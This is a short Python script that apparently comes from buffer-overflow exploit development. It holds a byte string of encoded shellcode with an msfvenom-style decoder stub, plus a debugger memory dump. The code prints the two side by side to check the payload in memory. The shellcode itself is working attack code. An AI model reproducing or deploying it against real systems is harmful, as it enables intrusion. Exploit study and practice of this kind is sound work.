payload =  b""
payload += b"\xd9\xf7\xd9\x74\x24\xf4\xb8\x19\x70\x83\xc7"
payload += b"\x5f\x2b\xc9\xb1\x32\x31\x47\x17\x83\xc7\x04"
payload += b"\x03\x5e\x63\x61\x32\x9c\x6b\xe7\xbd\x5c\x6c"
payload += b"\x88\x34\xb9\x5d\x88\x23\xca\xce\x38\x27\x9e"
payload += b"\xe2\xb3\x65\x0a\x70\xb1\xa1\x3d\x31\x7c\x94"
payload += b"\x70\xc2\x2d\xe4\x13\x40\x2c\x39\xf3\x79\xff"
payload += b"\x4c\xf2\xbe\xe2\xbd\xa6\x17\x68\x13\x56\x13"
payload += b"\x24\xa8\xdd\x6f\xa8\xa8\x02\x27\xcb\x99\x95"
payload += b"\x33\x92\x39\x14\x97\xae\x73\x0e\xf4\x8b\xca"
payload += b"\xa5\xce\x60\xcd\x6f\x1f\x88\x62\x4e\xaf\x7b"
payload += b"\x7a\x97\x08\x64\x09\xe1\x6a\x19\x0a\x36\x10"
payload += b"\xc5\x9f\xac\xb2\x8e\x38\x08\x42\x42\xde\xdb"
payload += b"\x48\x2f\x94\x83\x4c\xae\x79\xb8\x69\x3b\x7c"
payload += b"\x6e\xf8\x7f\x5b\xaa\xa0\x24\xc2\xeb\x0c\x8a"
payload += b"\xfb\xeb\xee\x73\x5e\x60\x02\x67\xd3\x2b\x49"
payload += b"\x76\x61\x56\x3f\x78\x79\x58\x10\x11\x48\xd3"
payload += b"\xff\x66\x55\x36\x44\x88\xb7\x92\xb1\x21\x6e"
payload += b"\x77\x78\x2c\x91\xa2\xbf\x49\x12\x46\x40\xae"
payload += b"\x0a\x23\x45\xea\x8c\xd8\x37\x63\x79\xde\xe4"
payload += b"\x84\xa8\xbd\x62\x1a\x21\x2c\x12\xac\xeb\xcb"
payload += b"\xac\x29\xf4"


hex_dump = """
0014fcdd  90909090 d9f7d990 b8f42474 c7837019
0014fced  b1c92b5f 17473132 0304c783 3261635e
0014fcfd  bde76b9c 34886c5c 23885db9 2738ceca
0014fd0d  65b3e29e a1b1700a 947c313d e42dc270
0014fd1d  392c4013 4cff79f3 bde2bef2 136817a6
0014fd2d  a8241356 a8a86fdd 99cb2702 39923395
0014fd3d  73ae9714 ca8bf40e cd60cea5 62881f6f
0014fd4d  7a7baf4e 09640897 0a196ae1 9fc51036
0014fd5d  388eb2ac de424208 945c48db 79ae4c83
0014fd6d  7c3b69b8 5b7ff86e c224a0aa fb8a0ceb
0014fd7d  5e73eeeb d3670260 6176492b 79783f56
0014fd8d  48111058 5566ffd3 b7884436 6e21b192
0014fd9d  912c7877 1249bfa2 0aae4046 8cea4523
0014fdad  796337d8 a884e4de 211a62bd ebac122c
0014fdbd  f429accb 41414141 41414141 41414141
"""

byte_arr = b""
for line in hex_dump.split("\n"):
    for dword in line.split(" ")[1:]:
        if not dword == "":
            byte_arr += bytes.fromhex(dword)[::-1]

hexdump_clean = (''.join([f'\\x{byte:02x}' for byte in byte_arr]))


aligner = 20

print(hexdump_clean[aligner:])

print()
print()

print(''.join([f'\\x{byte:02x}' for byte in payload]))
